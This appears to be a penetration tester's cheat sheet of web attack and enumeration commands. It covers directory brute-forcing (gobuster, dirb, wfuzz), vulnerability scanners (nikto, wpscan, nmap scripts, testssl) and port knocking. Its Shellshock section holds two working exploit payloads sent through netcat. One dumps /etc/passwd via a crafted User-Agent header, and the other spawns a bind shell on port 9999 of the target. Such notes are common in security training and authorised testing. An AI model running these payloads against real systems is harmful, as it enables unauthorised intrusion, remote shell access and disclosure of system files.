#Search for folders with gobuster

gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip

Dirb

#Dirb - Directory brute force finding using a dictionary file
dirb http://$ip/ wordlist.dict dirb <http://vm/>

#Dirb against a proxy
dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129

#Nikto 
nikto -h $ip
nikto -useproxy http://$ip:3128 -h $ip

--------------------------------------------------------------------------------------------------------
SHELLSHOCK
--------------------------------------------------------------------------------------------------------

echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80



--------------------------------------------------------------------------------------------------------
NMAP 
--------------------------------------------------------------------------------------------------------

# Test for shellshock
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip

# HTTP Enumeration with NMAP
nmap --script=http-enum -p80 -n $ip/24

# Nmap Check the server methods
nmap --script http-methods --script-args http-methods.url-path='/test' $ip

# Options from a web server
curl -vX OPTIONS vm/test

# Uniscan
uniscan -qweds -u <http://vm/>

--------------------------------------------------------------------------------------------------------
WFuzz
--------------------------------------------------------------------------------------------------------

wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ


# Port Knocking
Open a service using a port knock (Secured with Knockd)

for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done

#Wordpress Scanning
wpscan --url $ip/blog --proxy $ip:3129

#SSL Testing
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html






